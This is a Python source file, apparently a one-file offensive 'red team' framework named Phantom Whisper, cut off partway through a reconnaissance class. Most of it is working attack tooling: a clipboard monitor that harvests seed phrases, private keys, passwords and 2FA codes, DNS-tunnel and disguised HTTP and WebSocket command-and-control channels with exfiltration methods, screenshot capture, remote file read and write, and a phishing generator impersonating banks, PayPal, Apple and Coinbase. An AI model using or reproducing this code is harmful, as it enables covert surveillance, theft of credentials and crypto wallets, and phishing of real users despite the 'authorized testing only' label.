#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║                                                            ║
║        ██████  ██   ██  █████   ███    ██  ██████  ███    ██  ║
║        ██   ██ ██   ██ ██   ██ ████   ██ ██      ████   ██  ║
║        ██████  ███████ ███████ ██ ██  ██ ██      ██ ██  ██  ║
║        ██      ██   ██ ██   ██ ██  ██ ██ ██      ██  ██ ██  ║
║        ██      ██   ██ ██   ██ ██   ████  ██████ ██   ████  ║
║                                                            ║
║        ██    ██ ██   ██ ██ ██████  ██████  ██████  ██████   ║
║        ██    ██ ██   ██ ██ ██   ██ ██   ██ ██   ██ ██   ██  ║
║        ██    ██ ███████ ██ ██████  ██████  ██████  ██████   ║
║         ██████  ██   ██ ██ ██      ██   ██ ██   ██ ██   ██  ║
║                                                            ║
║              Phantom Whisper v2.0.0 — ONE FILE              ║
║       One file. Zero dependencies (self-installing). All 11 modules.     ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝

USAGE (noob level):
  1. Save this as phantom_whisper.py
  2. Run:   python phantom_whisper.py
  3. First run auto-installs everything. Zero manual steps.

COMMANDS:
  python phantom_whisper.py            → Interactive Red Team Framework
  python phantom_whisper.py --server   → C2 Server with Web Dashboard
  python phantom_whisper.py --install  → Install dependencies only
  python phantom_whisper.py --recon    → One-shot recon scan
  python phantom_whisper.py --help     → This help

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""

import os, sys, json, base64, hashlib, secrets, shutil, socket, struct, subprocess, threading, time, argparse, asyncio, importlib, platform, re, inspect, textwrap, random
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple, Callable
from dataclasses import dataclass, asdict
from enum import Enum

VERSION = "2.0.0"
SELF_PATH = Path(__file__).absolute()
SELF_DIR = SELF_PATH.parent
HOME = Path.home()
CONFIG_DIR = HOME / ".phantom"
LOG_DIR = CONFIG_DIR / "logs"
DATA_DIR = CONFIG_DIR / "data"
PLUGIN_DIR = SELF_DIR / "plugins"
for d in [CONFIG_DIR, LOG_DIR, DATA_DIR, PLUGIN_DIR]:
    d.mkdir(parents=True, exist_ok=True)

# ═══════════════════════════════════════════════════════════════════════════════
# AUTO-INSTALLER — runs first time, noob-proof
# ═══════════════════════════════════════════════════════════════════════════════

INSTALL_FLAG = CONFIG_DIR / ".installed"

def _pip_install(pkg: str) -> bool:
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", pkg],
                       capture_output=True, timeout=120)
        return True
    except: return False

def _check_import(mod: str) -> bool:
    try:
        __import__({"dnspython": "dns", "pycryptodome": "Cryptodome"}.get(mod, mod))
        return True
    except: return False

REQUIRED_DEPS = ["rich", "requests", "cryptography", "dnspython"]
OPTIONAL_DEPS = {
    "pycryptodome": "XChaCha20-Poly1305",
    "websockets": "WebSocket C2",
    "pillow": "Steganography",
    "mss": "Screenshots",
    "pynput": "Keylogger",
    "aiohttp": "Async HTTP",
}

def auto_install(force: bool = False) -> bool:
    """Auto-install all missing dependencies. Returns True if all OK."""
    if INSTALL_FLAG.exists() and not force:
        return _verify_install()
    
    print(f"\n{'='*50}")
    print(f"  Phantom Whisper — Auto-Installer")
    print(f"  Detected missing dependencies — installing now...")
    print(f"{'='*50}\n")
    
    missing_req = [p for p in REQUIRED_DEPS if not _check_import(p)]
    missing_opt = [p for p in OPTIONAL_DEPS if not _check_import(p)]
    
    if missing_req:
        print(f"  [Required] Installing: {', '.join(missing_req)}")
        for pkg in missing_req:
            ok = _pip_install(pkg)
            print(f"    {'✓' if ok else '✗'} {pkg}")
    
    if missing_opt:
        print(f"  [Optional] Installing: {', '.join(missing_opt)}")
        for pkg in missing_opt:
            ok = _pip_install(pkg)
            print(f"    {'✓' if ok else '✗'} {pkg} ({OPTIONAL_DEPS[pkg]})")
    
    # Create config
    _init_config()
    INSTALL_FLAG.write_text(VERSION)
    print(f"\n  {'='*50}")
    print(f"  ✓ Installation complete!")
    print(f"  {'='*50}\n")
    return _verify_install()

def _init_config():
    config = {
        "version": VERSION, "c2": {"dns_tunnel_domain": "c2.local", "dns_tunnel_port": 5353,
        "http_port": 8080, "ws_port": 8081, "c2_server_host": "0.0.0.0", "heartbeat_interval": 60, "jitter": 25},
        "encryption": {"kdf_iterations": 600000, "algorithm": "XChaCha20-Poly1305 + Fernet(AES-128-CBC)"},
        "plugins": {"enabled": True, "auto_reload": True},
        "updater": {"auto_update": True, "check_interval_days": 7}
    }
    (CONFIG_DIR / "config.json").write_text(json.dumps(config, indent=2))
    secret = os.urandom(32).hex()
    (CONFIG_DIR / ".secret").write_text(secret)
    (CONFIG_DIR / ".secret").chmod(0o600)
    # Sample plugins
    for fname, content in _SAMPLE_PLUGINS.items():
        (PLUGIN_DIR / fname).write_text(content)

def _verify_install() -> bool:
    ok = all(_check_import(p) for p in REQUIRED_DEPS)
    if ok and not INSTALL_FLAG.exists():
        INSTALL_FLAG.write_text(VERSION)
    return ok

_SAMPLE_PLUGINS = {
    "hello_world.py": '"""Sample plugin."""\nNAME="Hello World";VERSION="1.0";DESCRIPTION="Demo"\ndef run(app=None):\n    import platform\n    return {"plugin":NAME,"system":platform.system(),"node":platform.node(),"message":"Plugin system ALIVE!"}',
    "recon_extra.py": '"""Extended recon."""\nNAME="Extended Recon";VERSION="1.0";DESCRIPTION="Extra recon"\ndef run(app=None):\n    import subprocess\n    r={}\n    try:r["dns"]=subprocess.run(["resolvectl","status"],capture_output=True,text=True,timeout=5).stdout[:200]\n    except:pass\n    return r',
    "exfil_plugin.py": '"""WebSocket exfil."""\nNAME="WS Exfil";VERSION="1.0";DESCRIPTION="Exfil via WS"\ndef run(app=None):\n    if app and hasattr(app,"ws_channel")and app.ws_channel:\n        import json\n        try:app.ws_channel.send_sync({"type":"plugin_exfil","hostname":__import__("socket").gethostname(),"timestamp":__import__("datetime").datetime.now().isoformat(),"plugin":NAME});return{"status":"sent"}\n        except:return{"error":"send_failed"}\n    return{"status":"no_websocket"}',
}

def _confirm_deps():
    """Ensure deps are available before starting. If not, install."""
    if not _verify_install():
        auto_install(force=True)
    # Now try importing - if still fail, show error
    for p in REQUIRED_DEPS:
        try:
            __import__({"dnspython": "dns"}.get(p, p))
        except ImportError:
            print(f"[!] Failed to install {p}. Try: pip install {p}")
            sys.exit(1)

# ═══════════════════════════════════════════════════════════════════════════════
# IMPORTS (after auto-install)
# ═══════════════════════════════════════════════════════════════════════════════

_confirm_deps()

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.layout import Layout
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm
from rich.syntax import Syntax
from rich.tree import Tree
from rich.columns import Columns
from rich import box
from rich.text import Text
from rich.align import Align
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import requests as req_lib
import dns.resolver, dns.message, dns.query, dns.update, dns.tsig

# Optional imports
HAS_XCHACHA = False; HAS_WS = False; HAS_PIL = False; HAS_MSS = False
try: from Cryptodome.Cipher import ChaCha20_Poly1305; HAS_XCHACHA = True
except: pass
try: import websockets; HAS_WS = True
except: pass
try: from PIL import Image; HAS_PIL = True
except: pass
try: import mss; HAS_MSS = True
except: pass

console = Console()
log_file = LOG_DIR / f"session_{datetime.now().strftime('%Y%m%d')}.log"

def log(msg: str):
    ts = datetime.now().isoformat()
    with open(log_file, "a") as f: f.write(f"[{ts}] {msg}\n")

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════════════

class Config:
    def __init__(self):
        self.path = CONFIG_DIR / "config.json"
        self.data = self._load()
    def _load(self) -> dict:
        if self.path.exists():
            try: return json.loads(self.path.read_text())
            except: pass
        return {}  # Will refresh from _init_config defaults
    def refresh(self):
        self.data = self._load()
    def get(self, key: str, default=None):
        keys = key.split(".")
        val = self.data
        for k in keys:
            if isinstance(val, dict): val = val.get(k)
            else: return default
        return val if val is not None else default
    def set(self, key: str, value):
        keys = key.split(".")
        val = self.data
        for k in keys[:-1]:
            if k not in val: val[k] = {}
            val = val[k]
        val[keys[-1]] = value
        self.path.write_text(json.dumps(self.data, indent=2, default=str))
    def all(self) -> dict: return dict(self.data)

config = Config()

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 1: ENCRYPTION (XChaCha20-Poly1305 + Fernet fallback)
# ═══════════════════════════════════════════════════════════════════════════════

class Crypto:
    def __init__(self, password: Optional[str] = None):
        self.password = password or os.environ.get("PW_C2_PASSWORD", secrets.token_urlsafe(32))
        self.salt = base64.b64decode(os.environ.get("PW_C2_SALT", base64.b64encode(secrets.token_bytes(16)).decode()))
        self._init_fernet()
    def _init_fernet(self):
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=self.salt, iterations=600000)
        key = base64.urlsafe_b64encode(kdf.derive(self.password.encode()))
        self.fernet = Fernet(key)
    def encrypt(self, data: bytes) -> bytes:
        if HAS_XCHACHA:
            try:
                from Cryptodome.Random import get_random_bytes
                k = get_random_bytes(32); n = get_random_bytes(24)
                c = ChaCha20_Poly1305.new(key=k, nonce=n)
                ct, tag = c.encrypt_and_digest(data)
                return k + n + ct + tag
            except: pass
        return self.fernet.encrypt(data)
    def decrypt(self, data: bytes) -> bytes:
        if HAS_XCHACHA and len(data) > 72:
            try:
                k = data[:32]; n = data[32:56]; ct = data[56:-16]; tag = data[-16:]
                c = ChaCha20_Poly1305.new(key=k, nonce=n)
                return c.decrypt_and_verify(ct, tag)
            except: pass
        return self.fernet.decrypt(data)
    def encrypt_json(self, data: dict) -> str:
        return base64.b64encode(self.encrypt(json.dumps(data, default=str).encode())).decode()
    def decrypt_json(self, data: str) -> dict:
        return json.loads(self.decrypt(base64.b64decode(data)).decode())

crypto = Crypto()

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 2: PORT SCANNER
# ═══════════════════════════════════════════════════════════════════════════════

class PortScanner:
    def __init__(self, timeout: int = 2, max_threads: int = 50):
        self.timeout = timeout; self.max_threads = max_threads; self.results: List[dict] = []; self._lock = threading.Lock()
    def _guess(self, port: int) -> str:
        return {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",143:"IMAP",
                443:"HTTPS",445:"SMB",465:"SMTPS",993:"IMAPS",995:"POP3S",1433:"MSSQL",1521:"Oracle",
                2049:"NFS",3306:"MySQL",3389:"RDP",5432:"PostgreSQL",5900:"VNC",6379:"Redis",
                8080:"HTTP-Proxy",8443:"HTTPS-Alt",27017:"MongoDB"}.get(port, "unknown")
    def _scan(self, host: str, port: int):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(self.timeout)
            if s.connect_ex((host, port)) == 0:
                banner = ""
                try: s.send(b"\r\n"); banner = s.recv(1024).decode("utf-8", errors="replace").strip()[:200]
                except: pass
                with self._lock: self.results.append({"port": port, "state": "open", "service": self._guess(port), "banner": banner})
            s.close()
        except: pass
    def scan(self, host: str, ports: List[int]) -> List[dict]:
        self.results = []; threads = []
        for p in ports:
            t = threading.Thread(target=self._scan, args=(host, p)); threads.append(t); t.start()
            while len([t for t in threads if t.is_alive()]) >= self.max_threads: time.sleep(0.05)
        for t in threads: t.join()
        return self.results

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 3: NETWORK SCANNER
# ═══════════════════════════════════════════════════════════════════════════════

class NetScan:
    def __init__(self): self.scanner = PortScanner()
    def get_subnets(self) -> List[str]:
        nets = set()
        try:
            r = subprocess.run(["ip","route"], capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                if "src" in line:
                    p = line.split()
                    for i, w in enumerate(p):
                        if w == "src" and i+1 < len(p):
                            o = p[i+1].split(".")
                            if len(o)==4: nets.add(f"{o[0]}.{o[1]}.{o[2]}.0/24")
        except: pass
        try:
            ip = socket.gethostbyname(socket.gethostname()); o = ip.split(".")
            if len(o)==4: nets.add(f"{o[0]}.{o[1]}.{o[2]}.0/24")
        except: pass
        return list(nets) or ["127.0.0.0/8"]
    def ping_sweep(self, subnet: str, timeout: int = 1) -> List[str]:
        live = []; base = subnet.rsplit(".",1)[0]
        for i in range(1, 255):
            try:
                r = subprocess.run(["ping","-c","1","-W",str(timeout),f"{base}.{i}"], capture_output=True, timeout=timeout+2)
                if r.returncode==0: live.append(f"{base}.{i}")
            except: pass
        return live
    async def full_scan(self, ports: List[int] = None) -> Dict:
        nets = self.get_subnets(); results = {"networks": nets, "hosts": []}
        ports = ports or config.get("recon.scan_ports", [22,80,443,8080,8443,3306,3389,5900])
        for net in nets:
            console.print(f"  [cyan][*] Scanning: {net}")
            for host in self.ping_sweep(net):
                info = {"ip": host, "hostname": "", "ports": []}
                try: info["hostname"] = socket.gethostbyaddr(host)[0]
                except: pass
                info["ports"] = self.scanner.scan(host, ports)
                results["hosts"].append(info)
        log(f"Network scan: {len(results['hosts'])} hosts")
        return results

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 4: CLIPBOARD MONITOR
# ═══════════════════════════════════════════════════════════════════════════════

class ClipMon:
    def __init__(self):
        self.last = ""; self.history: List[dict] = []; self._running = False
        self.backend = self._detect()
        self.patterns = [
            ("Bitcoin", r"(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}"), ("Ethereum", r"0x[a-fA-F0-9]{40}"),
            ("API Key", r"(api[_-]?key|sk-[a-zA-Z0-9]{20,}|ghp_[a-zA-Z0-9]{36})"),
            ("Private Key", r"-----BEGIN (RSA |EC )?PRIVATE KEY-----"),
            ("Seed", r"\b(?:[a-z]+\s+){11,23}[a-z]+\b"), ("Email", r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"),
            ("Password", r"(?:password|passwd|pwd)[=:]\s*\S+"), ("Phone", r"\+?\d{7,15}"), ("2FA", r"\b\d{6}\b"),
        ]
    def _detect(self) -> Optional[str]:
        for cmd in ["xclip","xsel","termux-clipboard-get","pbpaste","wl-paste"]:
            if shutil.which(cmd): return cmd
        return None
    def _read(self) -> str:
        if not self.backend: return ""
        try: return subprocess.run(
            {"xclip":["xclip","-o","-selection","clipboard"],"xsel":["xsel","--clipboard","--output"],
             "termux-clipboard-get":["termux-clipboard-get"],"pbpaste":["pbpaste"],"wl-paste":["wl-paste"]}[self.backend],
            capture_output=True, text=True, timeout=2).stdout.strip()
        except: return ""
    def _check(self, content: str) -> List[Tuple[str,str]]:
        hits = []
        for label, pat in self.patterns:
            for m in re.findall(pat, content, re.I):
                masked = m[:6]+"***"+m[-4:] if len(m)>12 else "***"
                hits.append((label, masked))
        return hits
    def poll(self) -> Optional[dict]:
        cur = self._read()
        if cur and cur != self.last:
            self.last = cur; hits = self._check(cur)
            if hits:
                entry = {"timestamp": datetime.now().isoformat(), "content": cur[:200], "detections": hits}
                self.history.append(entry); log(f"Clipboard: {hits}"); return entry
        return None
    def start(self, interval: float = 2.0, callback: Callable = None):
        self._running = True
        def _loop():
            while self._running:
                r = self.poll()
                if r and callback: callback(r)
                time.sleep(interval)
        threading.Thread(target=_loop, daemon=True).start()
    def stop(self): self._running = False

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 5: DNS TUNNEL CLIENT
# ═══════════════════════════════════════════════════════════════════════════════

class DNSTunnel:
    def __init__(self, domain: str = "c2.local"):
        self.domain = domain; self.crypto = Crypto(); self.label_max = 60
        try: self.resolver = dns.resolver.Resolver()
        except: self.resolver = dns.resolver.Resolver(configure=False)
        self.resolver.nameservers = ['8.8.8.8','1.1.1.1']; self.resolver.timeout = 5; self.resolver.lifetime = 10
    def _encode(self, data: dict) -> str:
        b32 = base64.b32encode(self.crypto.encrypt(json.dumps(data,default=str).encode())).decode().lower().rstrip("=")
        return ".".join(b32[i:i+self.label_max] for i in range(0, len(b32), self.label_max))
    def beacon(self, device_id: str, data: dict) -> Optional[dict]:
        try:
            b32 = self._encode(data); q = f"{b32}.{device_id}.beacon.{self.domain}"
            answers = self.resolver.resolve(q, "TXT")
            for rdata in answers:
                txt = rdata.to_text().strip('"')
                if txt: return json.loads(self.crypto.decrypt(base64.b64decode(txt)).decode())
        except: pass
        return None
    def exfil(self, device_id: str, channel: str, data: dict) -> bool:
        try:
            q = f"{self._encode(data)}.{device_id}.{channel}.{self.domain}"
            self.resolver.resolve(q, "TXT"); return True
        except: return False

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 6: HTTP MIMIC C2
# ═══════════════════════════════════════════════════════════════════════════════

class HTTPMimic:
    def __init__(self, base: str = "http://127.0.0.1:8080"):
        self.base = base.rstrip("/"); self.crypto = Crypto(); self.session = req_lib.Session(); self.session.verify = False
        self.uas = ["Mozilla/5.0 (Linux; Android 14; Pixel 8)","Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)","Mozilla/5.0 (Linux; Android 13; SM-S908B)"]
        self.refs = ["https://www.google.com/","https://www.bing.com/","https://www.facebook.com/"]
    def _hdr(self) -> dict:
        return {"User-Agent": random.choice(self.uas), "Accept": "image/avif,image/webp,*/*;q=0.8", "Referer": random.choice(self.refs)}
    def poll(self, device_id: str) -> Optional[dict]:
        try:
            a = hashlib.sha256(f"{device_id}:{int(time.time())}".encode()).hexdigest()[:12]
            r = self.session.get(f"{self.base}/assets/images/ui-{a}.png", headers=self._hdr(), timeout=10)
            if r.status_code==200 and r.text.strip():
                try: return self.crypto.decrypt_json(r.text.strip())
                except: pass
        except: pass
        return None
    def send(self, device_id: str, channel: str, data: dict) -> bool:
        try:
            r = self.session.post(f"{self.base}/analytics/collect", data=self.crypto.encrypt_json(data), headers=self._hdr(), timeout=10)
            return r.status_code==200
        except: return False

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 7: STEGANOGRAPHY (PNG LSB)
# ═══════════════════════════════════════════════════════════════════════════════

class Stego:
    def encode(self, img_path: str, data: bytes, out: str = None) -> Optional[str]:
        if not HAS_PIL: return None
        try:
            img = Image.open(img_path).convert("RGB"); px = list(img.getdata()); w, h = img.size
            hdr = struct.pack(">Q", len(data)); payload = hdr + data
            if len(payload)*8 > len(px)*3: img.close(); return None
            new_px, di, bi = [], 0, 0
            for r,g,b in px:
                if di < len(payload):
                    if bi<8: r=(r&0xFE)|((payload[di]>>(7-bi))&1); bi+=1
                    if bi<8: g=(g&0xFE)|((payload[di]>>(7-bi))&1); bi+=1
                    if bi<8: b=(b&0xFE)|((payload[di]>>(7-bi))&1); bi+=1
                    if bi>=8: bi=0; di+=1
                new_px.append((r,g,b))
            new = Image.new("RGB",(w,h)); new.putdata(new_px)
            out = out or str(Path(img_path).parent/f"{Path(img_path).stem}_stego.png")
            new.save(out); img.close(); new.close(); return out
        except: return None
    def decode(self, img_path: str) -> Optional[bytes]:
        if not HAS_PIL: return None
        try:
            img = Image.open(img_path).convert("RGB"); px = list(img.getdata())
            bits = []
            for r,g,b in px[:8]: bits.extend([r&1,g&1,b&1])
            hb = []
            for i in range(8):
                b = 0
                for j in range(8):
                    idx=i*8+j
                    if idx<len(bits): b=(b<<1)|bits[idx]
                hb.append(b)
            dl = struct.unpack(">Q", bytes(hb))[0]; rem = px[8:]; bits = []
            for r,g,b in rem: bits.extend([r&1,g&1,b&1])
            db = []
            for i in range(dl):
                b = 0
                for j in range(8):
                    if i*8+j<len(bits): b=(b<<1)|bits[i*8+j]
                db.append(b)
            img.close(); return bytes(db)
        except: return None

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 8: SCREENSHOT
# ═══════════════════════════════════════════════════════════════════════════════

class Screenshot:
    def __init__(self):
        self.backend = "none"
        for cmd,b in [("scrot","scrot"),("import","imagemagick"),("gnome-screenshot","gnome"),("screencapture","macos"),("termux-screenshot","termux")]:
            if shutil.which(cmd): self.backend=b; break
        if self.backend=="none" and HAS_MSS: self.backend="mss"
    def capture(self, out: str = None) -> Optional[str]:
        out=out or f"/tmp/pw_shot_{int(time.time())}.png"
        try:
            if self.backend=="scrot": subprocess.run(["scrot","-z",out],capture_output=True,timeout=10)
            elif self.backend=="imagemagick": subprocess.run(["import","-window","root",out],capture_output=True,timeout=10)
            elif self.backend=="gnome": subprocess.run(["gnome-screenshot","-f",out],capture_output=True,timeout=10)
            elif self.backend=="macos": subprocess.run(["screencapture","-x",out],capture_output=True,timeout=10)
            elif self.backend=="mss":
                with mss.mss() as s: s.shot(output=out)
            if Path(out).exists(): return out
        except: pass
        return None
    def b64(self) -> Optional[str]:
        p=self.capture()
        if p: return base64.b64encode(Path(p).read_bytes()).decode()
        return None

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 9: WEBSOCKET C2
# ═══════════════════════════════════════════════════════════════════════════════

class WSC2:
    def __init__(self, url: str = "ws://127.0.0.1:8081/c2"):
        self.url=url; self.ws=None; self._running=False; self._delay=1; self._handlers:Dict[str,Callable]={}
    def on(self, e: str, h: Callable): self._handlers[e]=h
    def _emit(self, e: str, *a, **kw):
        if e in self._handlers: self._handlers[e](*a,**kw)
    async def connect(self) -> bool:
        if not HAS_WS: return False
        try:
            self.ws=await websockets.connect(self.url,ping_interval=30,ping_timeout=10); self._delay=1; self._emit("open"); return True
        except Exception as e: self._emit("error",e); return False
    async def listen(self):
        if not self.ws: return
        self._running=True
        try:
            async for msg in self.ws: self._emit("message",msg)
        except: pass
        finally: self._running=False; self._emit("close")
    async def send(self, data: Any):
        if self.ws and HAS_WS:
            await self.ws.send(json.dumps(data,default=str) if isinstance(data,dict) else str(data))
    def send_sync(self, data: Any):
        try: asyncio.run(self.send(data))
        except RuntimeError:
            l=asyncio.new_event_loop(); l.run_until_complete(self.send(data)); l.close()
    def start(self):
        async def _run():
            while self._running:
                try:
                    if await self.connect(): await self.listen()
                except: pass
                await asyncio.sleep(self._delay); self._delay=min(self._delay*2,60)
        self._running=True; threading.Thread(target=lambda: asyncio.run(_run()),daemon=True).start()
    def stop(self): self._running=False

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 10: GEO-IP
# ═══════════════════════════════════════════════════════════════════════════════

class GeoIP:
    def resolve(self, ip: str) -> Optional[dict]:
        for url in [f"https://ip-api.com/json/{ip}", f"https://ipapi.co/{ip}/json/", f"https://ipinfo.io/{ip}/json"]:
            try:
                r = req_lib.get(url, timeout=5)
                if r.status_code==200:
                    d=r.json(); return {"ip":ip,"country":d.get("country",d.get("country_name","")),"city":d.get("city",""),
                                         "org":d.get("org",d.get("as","")),"lat":d.get("lat",d.get("latitude",0)),"lon":d.get("lon",d.get("longitude",0))}
            except: pass
        return {"ip":ip,"error":"unresolved"}
    def own(self) -> Optional[dict]:
        try: return self.resolve(req_lib.get("https://api.ipify.org?format=json",timeout=5).json().get("ip",""))
        except: return None

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 11: FILE BROWSER
# ═══════════════════════════════════════════════════════════════════════════════

class FileBrowser:
    def __init__(self, root: str = str(HOME)):
        self.root = os.path.abspath(root)
    def _safe(self, path: str) -> Optional[str]:
        a = os.path.abspath(os.path.join(self.root, path.lstrip("/")))
        return a if a.startswith(self.root) else None
    def ls(self, path: str = ".") -> List[dict]:
        s = self._safe(path); r = []
        if not s or not os.path.isdir(s): return r
        for e in sorted(os.listdir(s)):
            try:
                f = os.path.join(s, e); st = os.stat(f)
                r.append({"name":e,"type":"dir" if os.path.isdir(f) else "file","size":st.st_size,"mode":oct(st.st_mode)[-3:],
                          "modified":datetime.fromtimestamp(st.st_mtime).isoformat()})
            except: pass
        return r
    def read(self, path: str, max_size: int = 1_048_576) -> Optional[dict]:
        s = self._safe(path)
        if not s or not os.path.isfile(s): return None
        try:
            sz = os.path.getsize(s)
            if sz > max_size: return {"error":f"Too large ({sz})","size":sz}
            return {"name":os.path.basename(s),"size":sz,"content_b64":base64.b64encode(Path(s).read_bytes()).decode()}
        except Exception as e: return {"error":str(e)}
    def write(self, path: str, content_b64: str) -> bool:
        s = self._safe(path)
        if not s: return False
        try: os.makedirs(os.path.dirname(s), exist_ok=True); Path(s).write_bytes(base64.b64decode(content_b64)); return True
        except: return False
    def tree(self, path: str = ".", depth: int = 3) -> List[str]:
        s = self._safe(path); lines = []
        if not s: return ["[INVALID]"]
        for root, dirs, files in os.walk(s):
            lvl = root.replace(s,"").count(os.sep)
            if lvl > depth: continue
            lines.append("  "*lvl+os.path.basename(root)+"/")
            for f in files: lines.append("  "*(lvl+1)+f)
        return lines

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 12: PLUGIN LOADER
# ═══════════════════════════════════════════════════════════════════════════════

class Plugins:
    def __init__(self): self.plugins: Dict[str, dict] = {}
    def scan(self) -> Dict[str, dict]:
        self.plugins = {}
        for f in sorted(PLUGIN_DIR.glob("*.py")):
            try:
                spec = importlib.util.spec_from_file_location(f.stem, str(f))
                if spec and spec.loader:
                    mod = importlib.util.module_from_spec(spec); spec.loader.exec_module(mod)
                    if hasattr(mod,"run"):
                        self.plugins[f.stem] = {"name":getattr(mod,"NAME",f.stem),"version":getattr(mod,"VERSION","0.1"),
                                                 "description":getattr(mod,"DESCRIPTION",""),"module":mod,"path":str(f)}
            except: pass
        return dict(self.plugins)
    def run(self, name: str, app=None) -> Optional[Any]:
        if name not in self.plugins: return None
        try: return self.plugins[name]["module"].run(app=app)
        except Exception as e: return {"error":str(e)}
    def run_all(self, app=None) -> Dict[str,Any]:
        return {n:self.run(n,app) for n in self.plugins}

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 13: AUTO-UPDATER
# ═══════════════════════════════════════════════════════════════════════════════

class Updater:
    REPO = "masterfrequency/Phantom-Whisper"
    def __init__(self): self.current=VERSION; self.latest=None; self.available=False
    def check(self) -> Optional[dict]:
        try:
            r = req_lib.get(f"https://api.github.com/repos/{self.REPO}/releases/latest",timeout=10,
                           headers={"Accept":"application/vnd.github.v3+json"})
            if r.status_code==200:
                d=r.json(); tag=d.get("tag_name","").lstrip("v"); self.latest=tag
                def parse(v):
                    parts=v.split(".")
                    return tuple(int(p) if p.isdigit() else 0 for p in parts)
                self.available=parse(tag)>parse(self.current)
                return {"current":self.current,"latest":tag,"available":self.available,"url":d.get("html_url","")}
        except: pass
        return None
    def update(self, force: bool = False) -> bool:
        if not self.available and not force: return False
        try:
            r = subprocess.run(["git","pull","origin","main"],capture_output=True,text=True,timeout=30)
            if r.returncode==0: self.current=self.latest or self.current; self.available=False; return True
        except: pass
        return False

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 14: AI PHISHING ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class Phish:
    def __init__(self):
        self.templates = {
            "bank":["URGENT: Unusual login detected on your {bank} account from {ip}. Verify: {url}",
                    "SECURITY ALERT: Your {bank} card locked due to suspicious activity. Unlock: {url}"],
            "netflix":["Your Netflix suspended. Reactivate: {url}","Payment declined. Update billing: {url}"],
            "google":["Google Account: Unusual sign-in blocked. Review: {url}","Security alert for {name}: Someone used your password."],
            "apple":["Apple ID locked. Verify: {url}","iCloud full. Upgrade: {url}"],
            "paypal":["PayPal: Unusual activity. Limited: {url}","You received $249.99! Confirm: {url}"],
            "security":["Password expires in 24h. Keep same: {url}","IT: Verify credentials due to breach: {url}"],
            "shipping":["DHL: Package waiting. $2.99 fee: {url}","Amazon: Delivery failed. Confirm: {url}"],
            "crypto":["Coinbase: 0.45 BTC withdrawal initiated. Cancel: {url}","MetaMask: Sync wallet. Import seed: {url}"],
        }
    def generate_sms(self, ctx: str, name: str = "User") -> str:
        ctx = ctx.lower().strip()
        cat = "security"
        for k in self.templates:
            if k in ctx or ctx in k: cat=k; break
        t = random.choice(self.templates[cat])
        ip = f"{random.randint(10,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        u = secrets.token_urlsafe(8)
        urls = {"bank":f"https://secure-{u[:6]}.com/login","netflix":f"https://account-{u[:6]}.netflix.com",
                "google":f"https://login-{u[:6]}.google.com","apple":f"https://appleid-{u[:4]}.icloud.co",
                "paypal":f"https://paypal-{u[:6]}.com/dispute","security":f"https://portal-{u[:6]}.company.com",
                "shipping":f"https://track-{u[:6]}.dhl.com","crypto":f"https://wallet-{u[:6]}.connect.coinbase.com"}
        return t.format(bank=ctx.title(),url=urls.get(cat,f"https://secure-{u[:6]}.com"),ip=ip,name=name)
    def generate_email(self, ctx: str, name: str = "User") -> Dict[str,str]:
        s = self.generate_sms(ctx, name)
        subs = {"bank":"Urgent: Security Alert","netflix":"Subscription Suspended","google":"Security Alert: Sign-in Blocked",
                "apple":"Apple ID Locked","paypal":"Unusual Activity Detected","security":"Password Verification Required",
                "shipping":"Delivery Confirmation Needed","crypto":"Suspicious Withdrawal Detected"}
        cat = ctx.lower().strip()
        sub = "Important: Action Required"
        for k in subs:
            if k in cat or cat in k: sub=subs[k]; break
        return {"subject":sub,"body":s,"sender":f"noreply@{ctx.lower().replace(' ','')}.com"}

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 15: DEVICE RECON
# ═══════════════════════════════════════════════════════════════════════════════

class Recon:
    def interfaces(self) -> List[dict]:
        r = []
        try:
            d = json.loads(subprocess.run(["ip","-json","addr"],capture_output=True,text=True,timeout=5).stdout)
            for i in d:
                for a in i.get("addr_info",[]):
                    r.append({"name":i["ifname"],"ip":a.get("local"),"mask":a.get("prefixlen"),"mac":i.get("address",""),"state":i.get("operstate","")})
        except: pass
        return r
    def wifi(self) -> List[dict]:
        r = []
        try:
            d = json.loads(subprocess.run(["termux-wifi-scaninfo"],capture_output=True,text=True,timeout=10).stdout)
            for n in d: r.append({"ssid":n.get("ssid","hidden"),"bssid":n.get("bssid",""),"signal":n.get("rssi",0)})
        except: pass
        try:
